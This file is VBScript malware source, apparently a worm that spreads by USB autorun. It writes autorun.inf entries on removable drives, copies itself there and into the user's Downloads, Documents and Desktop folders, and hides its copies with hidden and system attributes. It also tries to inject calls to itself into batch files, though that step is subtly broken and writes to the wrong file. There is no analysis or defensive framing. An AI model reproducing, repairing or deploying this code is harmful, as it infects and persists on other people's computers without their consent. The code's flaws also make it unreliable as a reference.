Set FSO = CreateObject("Scripting.FileSystemObject")
Set colDrives = FSO.Drives
Dim fileName
Const ForReading = 1, ForWriting = 2, ForAppending = 8, properties = 6
For Each drive in colDrives
	If drive.DriveType = 1 Then
		fileName = (drive.DriveLetter & ":\autorun.inf")
		If FSO.FileExists(fileName) = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.Close
		End If
		If FSO.GetFile(fileName).Size = 0 Then
			Set targetFile = FSO.OpenTextFile(fileName, ForWriting, True)
			targetFile.WriteLine("[AutoRun]")
			targetFile.Close
		End If
		Set targetFile = FSO.OpenTextFile(fileName, ForAppending)
		Set pattern = New RegExp
		pattern.IgnoreCase = False
		pattern.Global = True
		pattern.Pattern = "\[AutoRun\]"
		If pattern.Test(FSO.OpenTextFile(fileName).ReadAll) = False Then
			targetFile.WriteLine("[AutoRun]")
		End If
		targetFile.WriteLine("shellexecute=" & chr(34) & Wscript.ScriptName & chr(34))
		targetFile.Close
		If FSO.FileExists(drive.DriveLetter & ":\" & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, drive.DriveLetter & ":\"
			Set mapFile = FSO.GetFile(drive.DriveLetter & ":\" & Wscript.ScriptName)
			mapFile.Attributes = properties
		End If
		Set mapFile = FSO.GetFile(drive.DriveLetter & ":\autorun.inf")
		mapFile.Attributes = properties
	End If
Next
Dim SubFolder, basedir
basedir = "C:\Users\" & CreateObject( "WScript.Shell" ).ExpandEnvironmentStrings( "%USERNAME%" ) & "\" 

Function infectbat(folder)
	If FSO.FileExists(basedir & Folder.Name & Wscript.ScriptName) = 0 Then		
			FSO.CopyFile Wscript.ScriptFullName, basedir & Folder.Name
			Set mapFile = FSO.GetFile(basedir & Folder.Name & Wscript.ScriptName)
			mapFile.Attributes = properties			
	End If
	For Each searchtarget In folder.Files
		If LCase(FSO.GetExtensionName(searchtarget.Name)) = "bat" Then
            FSO.OpenTextFile(fileName, ForAppending).WriteLine( "cscript.exe" & basedir & Folder.Name & Wscript.ScriptName )
		End If
	Next
	For Each SubFolder In folder.SubFolders
        infectbat(SubFolder)
	Next
End Function
infectbat(FSO.GetFolder(basedir & "Downloads"))
infectbat(FSO.GetFolder(basedir & "Documents"))
infectbat(FSO.GetFolder(basedir & "Desktop"))